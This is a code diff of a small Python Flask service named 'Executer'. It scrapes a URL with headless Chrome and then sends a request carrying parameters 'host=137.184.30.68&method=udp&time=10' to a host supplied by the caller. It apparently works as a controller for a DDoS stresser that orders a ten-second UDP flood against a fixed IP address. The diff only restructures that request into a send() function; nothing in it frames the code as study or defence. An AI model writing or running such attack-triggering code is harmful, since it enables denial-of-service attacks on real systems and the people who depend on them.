@@ -26,9 +26,6 @@ def index():
     execute();
   return '{Executer: Online}'
 def execute():
-  host = request.args.get('host')
-  length = request.args.get('length')
-  method = 'udp';
   CHROMEDRIVER_PATH = os.environ.get('CHROMEDRIVER_PATH', '/usr/local/bin/chromedriver')
   GOOGLE_CHROME_BIN = os.environ.get('GOOGLE_CHROME_BIN', '/usr/bin/google-chrome')
   options = Options()
@@ -43,6 +40,11 @@ def execute():
   time.sleep(7)
   url = driver.execute_script("return document.getElementById('weburl').innerText;")
   print(url)
+  send();
+  time.sleep(10)
+def send():
+  host = request.args.get('host')
+  length = request.args.get('length')
   url = ""+host+"?host=137.184.30.68&method=udp&time=10"
 
   headers = CaseInsensitiveDict()
@@ -53,4 +55,3 @@ def execute():
   resp = requests.post(url, headers=headers)
 
   print(resp.status_code)
-  time.sleep(10)
